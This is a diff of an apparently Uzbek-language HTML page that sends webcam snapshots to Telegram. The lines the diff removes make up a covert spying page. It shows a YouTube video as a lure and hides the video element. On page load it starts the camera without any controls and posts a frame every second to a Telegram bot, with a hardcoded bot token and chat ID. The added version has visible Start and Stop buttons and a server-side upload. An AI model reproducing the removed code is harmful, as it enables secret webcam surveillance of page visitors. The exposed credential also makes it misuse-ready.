@@ -1,8 +1,8 @@
 <!doctype html>
 <html lang="uz">
 <head>
-  <meta charset="utf-8">
-  <title>A</title>
+  <meta charset="utf-8" />
+  <title>Kamera -> Telegram (secure)</title>
   <style>
     html, body {
       height: 100%;
@@ -15,109 +15,146 @@
       flex-direction: column;
       font-family: Arial, sans-serif;
     }
-    #hello {
-      font-size: 48px;
-      font-weight: bold;
-    }
-    #status {
-      font-size: 14px;
-      opacity: 0.9;
-      margin-top: 10px;
-    }
-    video, canvas {
-      display: none;
-    }
+    #controls { margin-top: 12px; display:flex; gap:8px; align-items:center; }
+    button { padding:8px 12px; border-radius:6px; border: none; cursor:pointer; }
+    #status { margin-top:10px; opacity:0.9; font-size:14px; }
+    video { width:320px; height:240px; background:#222; border-radius:8px; }
+    input[type="number"] { width:72px; padding:6px; border-radius:6px; }
+    canvas { display:none; }
   </style>
 </head>
 <body>
-<iframe width="853" height="480" src="https://www.youtube.com/embed/lRD_LGMkuzs?list=RDlRD_LGMkuzs" title="DALBAYOBSAN" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+  <h1 id="hello">Kamera → Telegram</h1>
 
+  <!-- video preview -->
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
-  <script>
-    // --- Telegram ma'lumotlari ---
-    const BOT_TOKEN = '8471262438:AAEFAMdTxDcAtKMzZFENdD0CxG2ZDWMlfi8';
-    const CHAT_ID = '1889969457';
-    // ------------------------------
+  <div id="controls">
+    <button id="startBtn">Start kamera</button>
+    <button id="stopBtn" disabled>Stop</button>
+    <label>
+      Interval (s):
+      <input id="intervalInput" type="number" min="1" value="5" />
+    </label>
+    <button id="snapBtn">Bir martalik snap</button>
+  </div>
 
+  <div id="status">Holat: tayyor</div>
+
+  <script>
+    // --- MUHIM: client brauzerga BOT_TOKEN yuklamaydi.
+    // Brauzer rasmni serverga yuboradi: /api/send-photo (server misol pastda).
+    const UPLOAD_ENDPOINT = '/api/send-photo'; // kerak bo'lsa to'liq URL: https://yourdomain.com/api/send-photo
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const status = document.getElementById('status');
+    const statusEl = document.getElementById('status');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const snapBtn = document.getElementById('snapBtn');
+    const intervalInput = document.getElementById('intervalInput');
+
     let stream = null;
-    let captureInterval = null;
+    let intervalId = null;
 
-    // Rasmni Telegramga yuboruvchi funksiya
-    async function sendToTelegram(blob) {
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      form.append('photo', blob, 'photo.jpg');
-
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: form
-        });
-        if (!res.ok) throw new Error('.');
-        const data = await res.json();
-        if (!data.ok) throw new Error('.');
-        console.log('✅ Rasm yuborildi', new Date().toLocaleTimeString());
-        status.textContent = `Rasm yuborildi: ${new Date().toLocaleTimeString()}`;
-      } catch (e) {
-        console.warn('❌', e);
-        status.textContent = '.';
-      }
+    function setStatus(text, isError = false) {
+      statusEl.textContent = `Holat: ${text}`;
+      statusEl.style.color = isError ? '#ff6666' : '#fff';
     }
 
-    // Har soniyada rasm olish
-    async function captureFrame() {
-      if (!video.videoWidth) return;
-      const w = video.videoWidth;
-      const h = video.videoHeight;
-      canvas.width = w;
-      canvas.height = h;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, w, h);
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
-      const blob = dataURItoBlob(dataUrl);
-      await sendToTelegram(blob);
-    }
-
-    function dataURItoBlob(dataURI) {
-      const byteString = atob(dataURI.split(',')[1]);
-      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-      const ab = new ArrayBuffer(byteString.length);
-      const ia = new Uint8Array(ab);
-      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-      return new Blob([ab], { type: mimeString });
-    }
-
-    // Kamera ishga tushirish
     async function startCamera() {
       try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        // Browser must be HTTPS or localhost for camera
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
         video.srcObject = stream;
-        status.textContent = '...';
-
-        // video tayyor bo‘lgach, har 1 soniyada rasm yuborish
-        await new Promise(resolve => {
-          if (video.readyState >= 2) return resolve();
-          video.onloadeddata = () => resolve();
-        });
-
-        // Har 1 sekundda rasmga olish
-        captureInterval = setInterval(captureFrame, 1000);
+        setStatus('Kamera ishga tushdi — ruxsat berildi');
+        startBtn.disabled = true;
+        stopBtn.disabled = false;
+        const intervalSec = Math.max(1, Number(intervalInput.value) || 5);
+        startPeriodicCapture(intervalSec * 1000);
       } catch (err) {
-        console.error(err);
+        console.error('camera error', err);
         if (err.name === 'NotAllowedError') {
-          status.textContent = '❌';
+          setStatus('Foydalanuvchi ruxsat bermadi (NotAllowedError)', true);
+        } else if (err.name === 'NotFoundError') {
+          setStatus('Kamera topilmadi (NotFoundError)', true);
         } else {
-          status.textContent = '❌' + err.message;
+          setStatus('Xatolik: ' + err.message, true);
         }
       }
     }
 
-    window.addEventListener('load', startCamera);
+    function stopCamera() {
+      if (intervalId) {
+        clearInterval(intervalId);
+        intervalId = null;
+      }
+      if (stream) {
+        stream.getTracks().forEach(t => t.stop());
+        stream = null;
+      }
+      video.srcObject = null;
+      setStatus('Kamera to‘xtatildi');
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+    }
+
+    function startPeriodicCapture(ms) {
+      if (intervalId) clearInterval(intervalId);
+      intervalId = setInterval(() => captureAndUpload(), ms);
+      setStatus(`Har ${ms/1000} s da rasm yuboriladi`);
+    }
+
+    async function captureAndUpload() {
+      if (!stream || !video.videoWidth) {
+        console.warn('Video tayyor emas');
+        return;
+      }
+      try {
+        const w = video.videoWidth;
+        const h = video.videoHeight;
+        canvas.width = w;
+        canvas.height = h;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, w, h);
+
+        // siqilgan jpeg data URL
+        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+        if (!blob) throw new Error('Blob olinmadi');
+
+        setStatus('Yuklanmoqda...');
+        // Yuborish serverga (server Telegramga yuboradi)
+        const form = new FormData();
+        form.append('photo', blob, 'photo.jpg');
+        // Optional: qo'shimcha ma'lumot jo'natish (masalan, chat_id override)
+        // form.append('chat_id', '1889969457');
+
+        const resp = await fetch(UPLOAD_ENDPOINT, { method: 'POST', body: form });
+        if (!resp.ok) {
+          const text = await resp.text().catch(()=>resp.statusText);
+          throw new Error(`Server xatosi: ${resp.status} ${text}`);
+        }
+        const json = await resp.json().catch(()=>null);
+        setStatus('Rasm yuborildi: ' + new Date().toLocaleTimeString());
+        console.log('Server javobi:', json);
+      } catch (err) {
+        console.error('upload error', err);
+        setStatus('Yuborishda xatolik: ' + err.message, true);
+      }
+    }
+
+    // Bir martalik snap
+    snapBtn.addEventListener('click', () => captureAndUpload());
+
+    startBtn.addEventListener('click', () => startCamera());
+    stopBtn.addEventListener('click', () => stopCamera());
+    intervalInput.addEventListener('change', () => {
+      const s = Math.max(1, Number(intervalInput.value) || 5);
+      if (stream) startPeriodicCapture(s * 1000);
+    });
+
+    // Agar siz localhost da sinov qilsangiz, sahifa yuklanganda start qilish mumkin:
+    // window.addEventListener('load', startCamera);
   </script>
 </body>
 </html>
